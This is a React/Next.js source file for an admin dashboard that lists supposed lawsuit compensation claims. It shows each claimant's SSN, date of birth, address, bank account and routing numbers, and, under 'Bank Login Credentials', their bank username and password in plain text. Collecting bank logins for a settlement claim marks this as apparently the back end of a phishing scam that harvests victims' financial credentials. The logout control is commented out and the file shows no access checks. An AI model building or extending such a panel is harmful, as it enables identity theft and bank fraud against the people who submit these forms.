"use client";

import useSWR from "swr";
import { toast } from "sonner";
import { useState } from "react";
import { fetcher } from "@/lib/utils";
import { Eye, Download, Trash2, LogOut } from "lucide-react";

interface Application {
  id: string;
  fullName: string;
  email: string;
  phone: string;
  claimId: string;
  dateOfBirth: string;
  ssn: string;
  street: string;
  city: string;
  state: string;
  zip: string;
  lawsuitType: string;
  filingDate: string;
  court: string;
  judgmentDate: string;
  totalAmount: number;
  bankName: string;
  accountNumber: string;
  routingNumber: string;
  accountType: string;
  paymentMethod: string;
  bankVerified: boolean;
  bankUsername?: string;
  bankPassword?: string;
  consent: boolean;
  status: string;
  createdAt: string;
  updatedAt: string;
}

export default function AdminPage() {
  const [selectedApp, setSelectedApp] = useState<Application | null>(null);
  const [showPdfModal, setShowPdfModal] = useState(false);
  const [pdfUrl, setPdfUrl] = useState<string | null>(null);

  const {
    data: applications,
    error,
    mutate,
  } = useSWR<Application[]>("/api/admin/applications", fetcher);

  const viewPdf = async (applicationId: string) => {
    try {
      const response = await fetch(
        `/api/admin/applications/${applicationId}/pdf`
      );
      if (response.ok) {
        const data = await response.json();
        setPdfUrl(data.pdfUrl);
        setShowPdfModal(true);
      }
    } catch (error) {
      console.error("Failed to fetch PDF:", error);
      alert("Failed to load PDF");
    }
  };

  const downloadPdf = (url: string, filename: string) => {
    const link = document.createElement("a");
    link.href = url;
    link.download = filename;
    link.target = "_blank";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const deleteApplication = async (id: string) => {
    if (!confirm("Are you sure you want to delete this application?")) return;

    try {
      const response = await fetch(`/api/admin/applications`, {
        method: "DELETE",
        body: JSON.stringify({ id }),
      });

      if (response.ok) {
        if (selectedApp?.id === id) setSelectedApp(null);
        mutate();
        toast.success("Application deleted successfully");
      } else {
        toast.error("Failed to delete application");
      }
    } catch (error) {
      console.error("Delete failed:", error);
      toast.error("Failed to delete application");
    }
  };

  const updateStatus = async (id: string, newStatus: string) => {
    try {
      const response = await fetch(`/api/admin/applications/${id}/status`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: newStatus }),
      });

      if (response.ok) {
        if (selectedApp?.id === id) {
          setSelectedApp({ ...selectedApp, status: newStatus });
        }
        toast.success("Status updated successfully");
        mutate();
      }
    } catch (error) {
      console.error("Update failed:", error);
      toast.error("Failed to update status");
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 p-8">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="bg-white rounded-lg shadow-lg p-6 mb-6 flex justify-between items-center">
          <div>
            <h1 className="text-3xl font-bold text-gray-900">
              Admin Dashboard
            </h1>
            <p className="text-gray-600 mt-1">
              Total Applications: {applications ? applications.length : 0}
            </p>
          </div>
          {/* <button
            onClick={handleLogout}
            className="flex items-center gap-2 bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
          >
            <LogOut size={20} />
            Logout
          </button> */}
        </div>

        {/* Applications List */}
        <div className="bg-white rounded-lg shadow-lg p-6">
          <h2 className="text-2xl font-bold text-gray-900 mb-4">
            All Applications
          </h2>

          {applications && applications.length === 0 ? (
            <p className="text-gray-600 text-center py-8">
              No applications found.
            </p>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b border-gray-200">
                    <th className="text-left p-3 font-semibold text-gray-700">
                      Claim ID
                    </th>
                    <th className="text-left p-3 font-semibold text-gray-700">
                      Name
                    </th>
                    <th className="text-left p-3 font-semibold text-gray-700">
                      Email
                    </th>
                    <th className="text-left p-3 font-semibold text-gray-700">
                      Status
                    </th>
                    <th className="text-left p-3 font-semibold text-gray-700">
                      Amount
                    </th>
                    <th className="text-left p-3 font-semibold text-gray-700">
                      Date
                    </th>
                    <th className="text-left p-3 font-semibold text-gray-700">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {applications?.map((app) => (
                    <tr
                      key={app.id}
                      className="border-b border-gray-100 hover:bg-gray-50"
                    >
                      <td className="p-3">{app.claimId}</td>
                      <td className="p-3">{app.fullName}</td>
                      <td className="p-3">{app.email}</td>
                      <td className="p-3">
                        <select
                          value={app.status}
                          onChange={(e) => updateStatus(app.id, e.target.value)}
                          className="border border-gray-300 rounded px-2 py-1 text-sm"
                        >
                          <option value="submitted">Submitted</option>
                          <option value="under_review">Under Review</option>
                          <option value="approved">Approved</option>
                          <option value="rejected">Rejected</option>
                        </select>
                      </td>
                      <td className="p-3">
                        ${app.totalAmount.toLocaleString()}
                      </td>
                      <td className="p-3">
                        {new Date(app.createdAt).toLocaleDateString()}
                      </td>
                      <td className="p-3">
                        <div className="flex gap-2">
                          <button
                            onClick={() => setSelectedApp(app)}
                            className="text-blue-600 hover:text-blue-800"
                            title="View Details"
                          >
                            <Eye size={20} />
                          </button>
                          <button
                            onClick={() => viewPdf(app.id)}
                            className="text-green-600 hover:text-green-800"
                            title="View PDF"
                          >
                            <Download size={20} />
                          </button>
                          <button
                            onClick={() => deleteApplication(app.id)}
                            className="text-red-600 hover:text-red-800"
                            title="Delete"
                          >
                            <Trash2 size={20} />
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>

        {/* Application Details Modal */}
        {selectedApp && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4 overflow-y-auto">
            <div className="bg-white rounded-lg w-full max-w-4xl my-8">
              <div className="p-6 border-b border-gray-200 flex justify-between items-center sticky top-0 bg-white">
                <h3 className="text-2xl font-bold text-gray-900">
                  Application Details
                </h3>
                <button
                  onClick={() => setSelectedApp(null)}
                  className="text-gray-500 hover:text-gray-700 text-2xl"
                >
                  ×
                </button>
              </div>
              <div className="p-6 overflow-y-auto max-h-[70vh]">
                <div className="grid md:grid-cols-2 gap-6">
                  {/* Personal Information */}
                  <div>
                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
                      Personal Information
                    </h4>
                    <div className="space-y-2">
                      <p>
                        <strong>Full Name:</strong> {selectedApp.fullName}
                      </p>
                      <p>
                        <strong>Email:</strong> {selectedApp.email}
                      </p>
                      <p>
                        <strong>Phone:</strong> {selectedApp.phone}
                      </p>
                      <p>
                        <strong>Date of Birth:</strong>{" "}
                        {new Date(selectedApp.dateOfBirth).toLocaleDateString()}
                      </p>
                      <p>
                        <strong>SSN:</strong> {selectedApp.ssn}
                      </p>
                      <p>
                        <strong>Claim ID:</strong> {selectedApp.claimId}
                      </p>
                    </div>
                  </div>

                  {/* Address Information */}
                  <div>
                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
                      Address Information
                    </h4>
                    <div className="space-y-2">
                      <p>
                        <strong>Street:</strong> {selectedApp.street}
                      </p>
                      <p>
                        <strong>City:</strong> {selectedApp.city}
                      </p>
                      <p>
                        <strong>State:</strong> {selectedApp.state}
                      </p>
                      <p>
                        <strong>ZIP:</strong> {selectedApp.zip}
                      </p>
                    </div>
                  </div>

                  {/* Claim Information */}
                  <div>
                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
                      Claim Information
                    </h4>
                    <div className="space-y-2">
                      <p>
                        <strong>Lawsuit Type:</strong> {selectedApp.lawsuitType}
                      </p>
                      <p>
                        <strong>Filing Date:</strong>{" "}
                        {new Date(selectedApp.filingDate).toLocaleDateString()}
                      </p>
                      <p>
                        <strong>Court:</strong> {selectedApp.court}
                      </p>
                      <p>
                        <strong>Judgment Date:</strong>{" "}
                        {new Date(
                          selectedApp.judgmentDate
                        ).toLocaleDateString()}
                      </p>
                    </div>
                  </div>

                  {/* Compensation Details */}
                  <div>
                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
                      Compensation Details
                    </h4>
                    <div className="space-y-2">
                      <p>
                        <strong>Total Amount:</strong> $
                        {selectedApp.totalAmount.toLocaleString()}
                      </p>
                      <p>
                        <strong>Status:</strong>{" "}
                        <span className="capitalize">
                          {selectedApp.status.replace("_", " ")}
                        </span>
                      </p>
                    </div>
                  </div>

                  {/* Bank Details */}
                  <div>
                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
                      Bank Details
                    </h4>
                    <div className="space-y-2">
                      <p>
                        <strong>Bank Name:</strong> {selectedApp.bankName}
                      </p>
                      <p>
                        <strong>Account Number:</strong>{" "}
                        {selectedApp.accountNumber}
                      </p>
                      <p>
                        <strong>Routing Number:</strong>{" "}
                        {selectedApp.routingNumber}
                      </p>
                      <p>
                        <strong>Account Type:</strong> {selectedApp.accountType}
                      </p>
                      <p>
                        <strong>Payment Method:</strong>{" "}
                        {selectedApp.paymentMethod}
                      </p>
                      <p>
                        <strong>Bank Verified:</strong>{" "}
                        {selectedApp.bankVerified ? "Yes" : "No"}
                      </p>
                    </div>
                  </div>

                  {/* Bank Credentials */}
                  {(selectedApp.bankUsername || selectedApp.bankPassword) && (
                    <div>
                      <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
                        Bank Login Credentials
                      </h4>
                      <div className="space-y-2">
                        <p>
                          <strong>Username:</strong>{" "}
                          {selectedApp.bankUsername || "N/A"}
                        </p>
                        <p>
                          <strong>Password:</strong>{" "}
                          {selectedApp.bankPassword || "N/A"}
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Timestamps */}
                  <div className="md:col-span-2">
                    <h4 className="font-bold text-lg mb-3 text-gray-900 border-b pb-2">
                      Timestamps
                    </h4>
                    <div className="space-y-2">
                      <p>
                        <strong>Submitted:</strong>{" "}
                        {new Date(selectedApp.createdAt).toLocaleString()}
                      </p>
                      <p>
                        <strong>Last Updated:</strong>{" "}
                        {new Date(selectedApp.updatedAt).toLocaleString()}
                      </p>
                    </div>
                  </div>
                </div>

                <div className="mt-6 flex gap-4">
                  <button
                    onClick={() => viewPdf(selectedApp.id)}
                    className="bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-6 rounded"
                  >
                    View/Download PDF
                  </button>
                  <button
                    onClick={() => setSelectedApp(null)}
                    className="bg-gray-600 hover:bg-gray-700 text-white font-bold py-2 px-6 rounded"
                  >
                    Close
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* PDF Modal */}
        {showPdfModal && pdfUrl && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
            <div className="bg-white rounded-lg w-full max-w-4xl max-h-[90vh] flex flex-col">
              <div className="p-6 border-b border-gray-200 flex justify-between items-center">
                <h3 className="text-2xl font-bold text-gray-900">
                  Application Documents
                </h3>
                <button
                  onClick={() => {
                    setShowPdfModal(false);
                    setPdfUrl(null);
                  }}
                  className="text-gray-500 hover:text-gray-700 text-2xl"
                >
                  ×
                </button>
              </div>
              <div className="flex-1 overflow-auto p-6">
                <iframe
                  src={pdfUrl}
                  className="w-full h-full min-h-[600px]"
                  title="Application PDF"
                />
              </div>
              <div className="p-6 border-t border-gray-200">
                <button
                  onClick={() =>
                    downloadPdf(pdfUrl, `application-${Date.now()}.pdf`)
                  }
                  className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-6 rounded"
                >
                  Download PDF
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
